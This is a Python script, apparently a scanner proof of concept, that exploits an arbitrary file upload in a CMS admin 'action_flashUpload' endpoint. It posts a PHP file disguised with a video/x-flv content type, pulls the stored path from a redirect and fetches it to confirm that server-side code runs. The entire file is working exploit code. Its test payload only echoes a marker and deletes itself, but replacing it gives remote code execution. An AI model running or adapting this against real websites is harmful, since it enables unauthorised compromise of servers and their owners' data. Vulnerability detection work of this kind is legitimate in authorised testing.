import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(8)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r2=randomLowercase(8)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"cms/manage/admin.php?m=manage&c=background&a=action_flashUpload"
	body='''----------------------------835846770881083140190666\r
Content-Disposition: form-data; name="filePath"; filename="'''+r1+'''.php"\r
Content-Type: video/x-flv\r
\r
<?php echo "'''+r2+'''"; unlink(__FILE__); ?>\r
----------------------------835846770881083140190666--'''
	headers={'Content-Type': 'multipart/form-data; boundary=--------------------------835846770881083140190666'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList=response.history
	flag=[]
	for response in reditList:
		if response.status_code == 302 and "MAIN_URL_ROOT/" in response.text:
			try:
				p=re.findall("MAIN_URL_ROOT(.+)",response.text)[0]
			except:
				p=''
			flag.append(p)
			break
	if len(flag)>0:
		r0=True
		path=flag[0]
	else:
		path=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"cms/{path}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and r2 in response.text:
		r11=True
	else:
		r11=False
	if r0 and r11:
		return True
	else:
		return False
